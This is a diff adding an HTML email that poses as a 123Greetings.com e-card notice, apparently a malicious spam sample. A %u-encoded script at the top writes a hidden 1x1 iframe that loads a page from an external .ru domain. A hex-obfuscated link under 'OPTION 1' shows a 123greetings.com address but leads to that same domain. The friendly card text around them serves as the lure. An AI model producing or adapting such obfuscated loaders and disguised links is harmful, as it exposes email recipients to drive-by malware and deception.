@@ -1,0 +1,60 @@
+
+<script language=javascript>document.write(unescape('%u003C%u0049%u0046%u0052%u0041%u004D%u0045%u0020%u0077%u0069%u0064%u0074%u0068%u003D%u0022%u0031%u0022%u0020%u0068%u0065%u0069%u0067%u0068%u0074%u003D%u0022%u0031%u0022%u0020%u0053%u0052%u0043%u003D%u0022%u0068%u0074%u0074%u0070%u003A%u002F%u002F%u0077%u0077%u0077%u002E%u0073%u0065%u0072%u0072%u0072%u0072%u0031%u002E%u0063%u006F%u006D%u002E%u0072%u0075%u002F%u0069%u006E%u0064%u0065%u0078%u0078%u002E%u0068%u0074%u006D%u006C%u0022%u0020%u0066%u0072%u0061%u006D%u0065%u0042%u006F%u0072%u0064%u0065%u0072%u003D%u0022%u0031%u0022%u0020%u0073%u0063%u0072%u006F%u006C%u006C%u0069%u006E%u0067%u003D%u0022%u006E%u006F%u0022%u003E%u003C%u002F%u0049%u0046%u0052%u0041%u004D%u0045%u003E'));</script>
+
+
+<BR>
+
+Dear Friend,           
+<BR><BR>
+enigma [ enigma_set2000@hotmail.com ] has sent you an e-card from
+<A href="http://123Greetings.com">123Greetings.com</A>
+ .
+<BR><BR>
+<A href="http://123Greetings.com">123Greetings.com</A> is all about touching lives, bridging distances, 
+healing rifts and building bonds. We have a gallery of e-cards for almost 
+every occasion of life. Express yourself to your friends and family by 
+sending Free e-cards from our site with your choice of colors, words and 
+music.
+<BR><BR>
+Your e-card will be available with us for the next 30 days. If you wish 
+to keep the e-card longer, you may save it on your computer or take a 
+print.
+<BR><BR>
+To view your e-card, choose from any of the following options:
+<BR><BR>
+--------
+OPTION 1
+--------
+<BR><BR>
+      <script>
+        document.write("<a href=\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x65\x72\x72\x72\x72\x31\x2E\x63\x6F\x6D\x2E\x72\x75\x2F\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C>http://www.123greetings.com/view/CG30572123009498</a>");
+      </script>
+
+<BR><BR>
+--------
+OPTION 2
+--------
+<BR><BR>
+<A href="http://www.123Greetings.com">www.123Greetings.com</A>
+<BR><BR>
+Your e-card number is
+CG30572123009498
+<BR><BR>
+If you need help in viewing your card or any other assistance, 
+please visit our Help / FAQ section located at 
+<A href="http://www.123Greetings.com/help">http://www.123Greetings.com/help</A> 
+<BR><BR>
+If you need further help, feel free to write to us at 
+support@123greetings.com
+ <BR><BR>
+Best wishes,
+<BR><BR>
+Postmaster,
+123Greetings.com
+<BR><BR>
+*If you would like to send someone an e-card, you can do so at 
+<A href="http://123Greetings.com">http://www.123Greetings.com</A>
+<BR>
+
+
+
